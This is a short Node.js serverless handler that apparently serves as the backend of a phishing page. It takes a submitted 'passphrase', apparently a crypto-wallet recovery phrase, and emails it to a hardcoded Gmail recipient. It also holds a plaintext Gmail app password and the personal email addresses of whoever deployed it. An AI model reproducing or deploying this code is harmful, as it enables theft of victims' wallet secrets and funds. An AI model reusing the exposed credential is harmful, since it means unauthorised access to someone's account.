const nodemailer = require('nodemailer');

// Hardcoded Gmail SMTP configuration
const EMAIL_USER = "relate2hazel@gmail.com"; // Replace with your Gmail address
const EMAIL_PASS = "yurtanlosnxkpadu"; // Replace with your Gmail app password
const EMAIL_TO = "thierryalain647@gmail.com"; // Replace with the recipient email address

// Create a Nodemailer transporter for Gmail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    port: 465,
    secure: true, // Use SSL
    auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS,
    },
});

module.exports = async (req, res) => {
    console.log("Request received:", req.method, req.body); // Log the request
    if (req.method === 'POST') {
        const { passphrase } = req.body;

        if (!passphrase) {
            return res.status(400).json({ error: 'Passphrase is required' });
        }

        try {
            // Send email
            const mailOptions = {
                from: EMAIL_USER,
                to: EMAIL_TO,
                subject: 'Passphrase Received',
                text: `Passphrase: ${passphrase}`,
            };

            const info = await transporter.sendMail(mailOptions);
            console.log("Email sent:", info.response); // Log the email response

            res.status(200).json({ success: true });
        } catch (error) {
            console.error("Error:", error); // Log the error
            res.status(500).json({ error: 'Failed to send email' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
};

